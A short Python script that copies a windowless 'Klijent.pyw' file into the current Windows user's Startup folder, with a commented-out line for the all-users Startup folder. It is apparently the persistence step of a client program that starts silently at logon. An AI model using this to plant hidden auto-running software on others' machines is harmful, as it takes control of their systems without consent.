import getpass
import shutil
import os

user = getpass.getuser()

targetDir = "C:\\Users\\" + user +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
#targetDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

currentDir = os.getcwd()

shutil.copy2(currentDir + "\\Klijent.pyw" , targetDir)
